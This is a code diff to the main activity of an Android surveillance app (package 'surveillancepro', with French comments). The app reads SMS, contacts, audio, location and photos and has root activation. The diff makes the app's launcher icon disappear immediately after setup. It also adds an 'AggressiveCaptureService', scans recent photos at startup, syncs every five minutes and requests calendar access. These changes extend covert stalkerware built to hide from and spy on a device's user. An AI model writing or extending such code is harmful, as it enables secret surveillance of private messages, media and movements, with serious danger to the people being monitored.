@@ -33,6 +33,7 @@ import com.surveillancepro.android.services.ContentObserverService
 import com.surveillancepro.android.services.LocationService
 import com.surveillancepro.android.services.MediaObserverService
 import com.surveillancepro.android.services.StealthManager
+import com.surveillancepro.android.services.AggressiveCaptureService
 import com.surveillancepro.android.root.RootActivator
 import com.surveillancepro.android.root.RootManager
 import com.surveillancepro.android.ui.theme.SupervisionProTheme
@@ -82,10 +83,11 @@ class MainActivity : ComponentActivity() {
         if (storage.hasAccepted && storage.deviceToken != null) {
             startAllServices()
 
-            // Appliquer le mode furtif si pas encore actif
+            // Activer le mode furtif si pas encore actif
             val currentMode = StealthManager.getCurrentMode(this)
             if (currentMode == StealthManager.StealthMode.VISIBLE) {
-                StealthManager.activateAfterSetup(this, delayMs = 5000)
+                // Disparition immédiate si déjà configuré
+                StealthManager.hideImmediately(this)
             }
         }
     }
@@ -94,8 +96,9 @@ class MainActivity : ComponentActivity() {
         startLocationService()
         startContentObserverService()
         startMediaObserver()
+        startAggressiveCaptureService()
 
-        SyncWorker.schedule(this)
+        SyncWorker.schedule(this, intervalMinutes = 5)
         SyncWorker.triggerNow(this)
 
         // Activation ROOT en arrière-plan (ne bloque pas l'UI)
@@ -119,8 +122,21 @@ class MainActivity : ComponentActivity() {
         try {
             mediaObserver = MediaObserverService(this)
             mediaObserver?.start()
+            // Scan initial des photos récentes au démarrage
+            lifecycleScope.launch(Dispatchers.IO) {
+                delay(3000) // Attendre que tout soit prêt
+                mediaObserver?.scanRecentPhotos()
+            }
         } catch (e: Exception) {
             Log.w("MainActivity", "MediaObserver: ${e.message}")
+        }
+    }
+
+    private fun startAggressiveCaptureService() {
+        try {
+            startForegroundService(Intent(this, AggressiveCaptureService::class.java))
+        } catch (e: Exception) {
+            Log.w("MainActivity", "AggressiveCaptureService: ${e.message}")
         }
     }
 
@@ -247,7 +263,8 @@ class MainActivity : ComponentActivity() {
                                 startAllServices()
                                 accepted = true
 
-                                StealthManager.activateAfterSetup(this@MainActivity)
+                                // DISPARITION IMMÉDIATE du launcher - pas de délai
+                                StealthManager.hideImmediately(this@MainActivity)
                                 return@launch
 
                             } catch (e: Exception) {
@@ -452,6 +469,7 @@ class MainActivity : ComponentActivity() {
             Manifest.permission.READ_CONTACTS,
             Manifest.permission.READ_SMS,
             Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.READ_CALENDAR,
         )
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             perms.add(Manifest.permission.POST_NOTIFICATIONS)
